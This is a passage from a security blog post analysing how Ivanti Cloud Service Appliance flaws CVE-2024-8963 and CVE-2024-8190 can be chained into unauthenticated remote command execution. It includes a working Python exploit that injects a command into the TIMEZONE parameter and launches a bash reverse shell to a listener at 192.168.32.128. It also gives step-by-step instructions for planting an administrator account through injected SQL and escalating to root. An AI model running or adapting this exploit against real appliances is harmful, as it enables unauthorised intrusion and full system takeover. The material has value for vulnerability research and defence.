                <span class="nt">&lt;/map&gt;</span>
        <span class="nt">&lt;/directory&gt;</span>
<span class="nt">&lt;/application&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>By performing reverse engineering analysis on Broker, one can carefully craft an attack payload as shown in the figure to trigger an authentication bypass vulnerability.</p>

<p><a href="/assets/img/csa/path.png" class="popup img-link  shimmer"><img src="/assets/img/csa/path.png" alt="alt text" loading="lazy"></a></p>

<p>Broker executes the <code class="language-plaintext highlighter-rouge">php-cgi</code> program using the <code class="language-plaintext highlighter-rouge">execve</code> function and passes request information such as <code class="language-plaintext highlighter-rouge">script_name</code> and <code class="language-plaintext highlighter-rouge">path_info</code> as environment variables to <code class="language-plaintext highlighter-rouge">php-cgi</code>. This mechanism allows <code class="language-plaintext highlighter-rouge">php-cgi</code> to obtain the relevant request information during execution, enabling it to correctly process the request and generate the appropriate response content.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PATH_INFO 	/gsb/index.php
PATH_TRANSLATED 	/opt/landesk/broker/webroot/gsb/index.php
SCRIPT_NAME 	/client/index.php 
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/csa/execve.png" class="popup img-link  shimmer"><img src="/assets/img/csa/execve.png" alt="alt text" loading="lazy"></a></p>

<p>According to the <a href="https://github.com/php/php-src/blob/php-5.4.45/sapi/cgi/cgi_main.c#L1146">source code</a> of <code class="language-plaintext highlighter-rouge">php-cgi</code>, it can be seen that it determines the full path of the currently executing script by obtaining the environment variable <code class="language-plaintext highlighter-rouge">SCRIPT_FILENAME</code>. Under normal circumstances, this value is passed to the CGI program by the Web server, indicating the file path of the PHP script to be executed. However, in some cases, if <code class="language-plaintext highlighter-rouge">SCRIPT_FILENAME</code> does not have a value, <code class="language-plaintext highlighter-rouge">php-cgi</code> will use <code class="language-plaintext highlighter-rouge">PATH_TRANSLATED</code> as the script path.</p>

<p><a href="/assets/img/csa/php.png" class="popup img-link  shimmer"><img src="/assets/img/csa/php.png" alt="alt text" loading="lazy"></a></p>

<p>For Broker, when executing <code class="language-plaintext highlighter-rouge">php-cgi</code>, it passes environment variables through the <code class="language-plaintext highlighter-rouge">execve</code> function, but does not set <code class="language-plaintext highlighter-rouge">SCRIPT_FILENAME</code>. In this case, <code class="language-plaintext highlighter-rouge">php-cgi</code> may rely on <code class="language-plaintext highlighter-rouge">PATH_TRANSLATED</code> to determine the script path.</p>

<p><a href="/assets/img/csa/gsb.png" class="popup img-link  shimmer"><img src="/assets/img/csa/gsb.png" alt="alt text" loading="lazy"></a></p>

<h3 id="command-injection"><span class="me-2">Command Injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="cve-2024-8190"><span class="me-2">CVE-2024-8190</span><a href="#cve-2024-8190" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>According to the analysis of CVE-2024-8190 by horizon3, in the <code class="language-plaintext highlighter-rouge">datetime.php</code> file, when the <code class="language-plaintext highlighter-rouge">dateTimeFormSubmitted</code> parameter meets certain conditions, it calls the <code class="language-plaintext highlighter-rouge">handleDateTimeSubmit</code> method in <code class="language-plaintext highlighter-rouge">DateTimeTab.php</code>. This method passes the unfiltered <code class="language-plaintext highlighter-rouge">$TIMEZONE</code> parameter to the <code class="language-plaintext highlighter-rouge">setSystemTimeZone</code> method, allowing malicious input to be executed by the <code class="language-plaintext highlighter-rouge">exec()</code> function, thereby causing a command injection vulnerability. However, the exploit script provided by horizon3 requires authentication.</p>

<p>To achieve unauthenticated command execution, the vulnerability can be combined with an authentication bypass vulnerability.</p>

<p><a href="/assets/img/csa/code1.png" class="popup img-link  shimmer"><img src="/assets/img/csa/code1.png" alt="alt text" loading="lazy"></a></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">urllib3</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/client/index.php/gsb/datetime.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">name=[</span><span class="sh">'</span><span class="s">\"]LDCSA_CSRF[</span><span class="sh">'</span><span class="s">\"]\s+value=[</span><span class="sh">'</span><span class="s">\"]([^</span><span class="sh">'</span><span class="s">\"]+)[</span><span class="sh">'</span><span class="s">\"]</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
        <span class="n">ldcsa</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Got LDCSA_CSRF value: </span><span class="si">{</span><span class="n">ldcsa</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Failed getting LDCSA_CRSF token</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">dateTimeFormSubmitted</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">TIMEZONE</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">; `</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">` ;</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">CYEAR</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">2024</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">CMONTH</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">9</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">CDAY</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">13</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">CHOUR</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">12</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">CMIN</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">34</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">LDCSA_CSRF</span><span class="sh">"</span><span class="p">:</span> <span class="n">ldcsa</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">SUBMIT_TIME</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Save</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Sending payload...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/client/index.php/gsb/datetime.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>

<span class="nf">exploit</span><span class="p">(</span><span class="sh">"</span><span class="s">https://192.168.32.127</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/192.168.32.128/4444 0&gt;&amp;1</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/csa/CVE-2024-8190.png" class="popup img-link  shimmer"><img src="/assets/img/csa/CVE-2024-8190.png" alt="alt text" loading="lazy"></a></p>

<h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>According to Fortinet’s analysis of CVE-2024-8190, there is another command execution vulnerability in <code class="language-plaintext highlighter-rouge">reports.php</code>, which has root privileges. When the page loads, the <code class="language-plaintext highlighter-rouge">showFilesLog</code> method is called, which ultimately invokes the <code class="language-plaintext highlighter-rouge">exec</code> function to execute the <code class="language-plaintext highlighter-rouge">tripwire</code> command with <code class="language-plaintext highlighter-rouge">sudo</code> privileges. Although the input data is filtered using <code class="language-plaintext highlighter-rouge">escapeshellarg</code>, when it is passed to the <code class="language-plaintext highlighter-rouge">update</code> function of <code class="language-plaintext highlighter-rouge">tripwire</code>, parameter concatenation still occurs, leading to command execution.</p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">page</span> <span class="kd">extends</span> <span class="nc">GWSitePage</span>
<span class="p">{</span>
  <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span> <span class="nv">$config</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">parent</span><span class="o">::</span><span class="nf">__construct</span><span class="p">(</span> <span class="nv">$config</span> <span class="p">);</span>
    
    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">reportsTab</span><span class="p">(</span><span class="s2">"t1"</span><span class="p">,</span><span class="s2">"Reports"</span><span class="p">);</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">addPane</span><span class="p">(</span> <span class="nv">$a</span> <span class="p">);</span> 
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setDefaultPane</span><span class="p">(</span> <span class="s2">"t1"</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="k">function</span> <span class="n">displayHilites</span><span class="p">()</span>
  <span class="p">{</span>
    <span class="k">print</span><span class="p">(</span><span class="nf">getString</span><span class="p">(</span><span class="s1">'WEB_REPORTS_BROKER_HELP'</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">page</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/csa/code2.png" class="popup img-link  shimmer"><img src="/assets/img/csa/code2.png" alt="alt text" loading="lazy"></a>
However, this vulnerability cannot be exploited in conjunction with an authentication bypass vulnerability, as it presupposes that the attacker already has a valid account. To this end, I have devised the following method to exploit the vulnerability:</p>

<ol>
  <li>
    <p>Obtain CSA backup file: First, use the CVE-2024-8190 vulnerability to successfully acquire the backup file of the CSA (Ivanti Cloud Service Appliance). This backup file contains key data and configuration information of the CSA, laying the foundation for subsequent operations.</p>
  </li>
  <li>
    <p>Import local simulation environment and create an account: Import the obtained target backup file into the locally built CSA simulation environment. Use the command-line tool <code class="language-plaintext highlighter-rouge">/opt/landesk/broker/dbtool</code> to create an account with administrative privileges in the simulation environment. This step allows us to have higher operational permissions in the simulation environment, preparing for further vulnerability exploitation.</p>
  </li>
  <li>
    <p>Export backup and extract SQL statement: Perform a backup operation in the local simulation environment to export a new backup file. Carefully analyze this backup file and precisely extract the SQL statement used when creating the user. This SQL statement contains key information required to create an administrative account, such as the username and password.</p>
  </li>
  <li>
    <p>Execute SQL statement using CVE-2024-8190: Use the extracted SQL statement as a parameter and exploit the CVE-2024-8190 vulnerability again to execute the SQL statement in the real target CSA environment. In this way, an administrative account is successfully created in the target CSA, bypassing the original authentication restrictions.</p>
  </li>
  <li>
    <p>Log in with the user and execute the privilege escalation vulnerability: Log in to the CSA with the newly created administrative account, which now has higher operational permissions. Then, execute known privilege escalation vulnerability exploitation methods to further elevate privileges and gain the highest level of system control.</p>
  </li>
</ol>

<p><a href="/assets/img/csa/pr.png" class="popup img-link  shimmer"><img src="/assets/img/csa/pr.png" alt="alt text" loading="lazy"></a></p>

<h2 id="reference"><span class="me-2">Reference</span><a href="#reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>[1] https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa</p>

<p>[2] https://www.horizon3.ai/attack-research/cisa-kev-cve-2024-8190-ivanti-csa-command-injection</p>

<p>[3] https://www.youtube.com/watch?v=f3bP-wm5tJA</p>

<p>[4] https://download.ivanti.com/product/CSA/46/ldcsa-scsi-csrffix.iso</p>

<p>[5] https://github.com/hoohack/read-php-src/blob/36c410bfe7f8afce9aff92fb196e4243984491cb/php-5.4/sapi/cgi/cgi_main.c#L1146</p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/vulnerability/">vulnerability</a>,
          <a href="/categories/ivanti/">IVanti</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ivanti/"
            class="post-tag no-text-decoration"
          >IVanti</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Vulnerability%20Review:Ivanti%20CSA%20Exploits%20Authentication%20Bypass%20(CVE-2024-8963)%20and%20Command%20Injection%20(CVE-2024-8190)%20-%20imjdl%20blog&url=%2Fposts%2Fivanti-csa%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnerability%20Review:Ivanti%20CSA%20Exploits%20Authentication%20Bypass%20(CVE-2024-8963)%20and%20Command%20Injection%20(CVE-2024-8190)%20-%20imjdl%20blog&u=%2Fposts%2Fivanti-csa%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2Fivanti-csa%2F&text=Vulnerability%20Review:Ivanti%20CSA%20Exploits%20Authentication%20Bypass%20(CVE-2024-8963)%20and%20Command%20Injection%20(CVE-2024-8190)%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ivanti-csa/">Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/showdoc-sql-injection-and-rce/">ShowDoc Sql Injection and Remote Code Execution</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/zentao-auth-bypass/">Zentao Authentication Bypass</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ip-guard-auth-bypass/">IP-guard Authentication Bypass</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-21650/">CVE-2024-21650 XWiki RCE</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/showdoc-sql-injection-and-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1717301580"
  data-df="ll"
  
>
  Jun  2, 2024
</time>

              <h4 class="pt-0 my-2">ShowDoc Sql Injection and Remote Code Execution</h4>
              <div class="text-muted">
                <p>Overview

ShowDoc is a versatile online documentation tool tailored for IT teams, perfect for creating beautiful API documents,
tech manuals, and more using markdown. Its features include automated...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/zentao-auth-bypass/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1714104780"
  data-df="ll"
  
>
  Apr 26, 2024
</time>

              <h4 class="pt-0 my-2">Zentao Authentication Bypass</h4>
              <div class="text-muted">
                <p>Overview
ZenTao is a widely used open-source project management software that offers functionalities like project management,
product management, test management, document management, bug managemen...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ip-guard-auth-bypass/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1713327180"
  data-df="ll"
  
>
  Apr 17, 2024
</time>

              <h4 class="pt-0 my-2">IP-guard Authentication Bypass</h4>
              <div class="text-muted">
                <p>Overview

IP-guard is an enterprise information supervision system developed by a Chinese company. It is a simple, easy-to-use,
and fully functional computer monitoring and control tool that preven...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/showdoc-sql-injection-and-rce/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>ShowDoc Sql Injection and Remote Code Execution</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

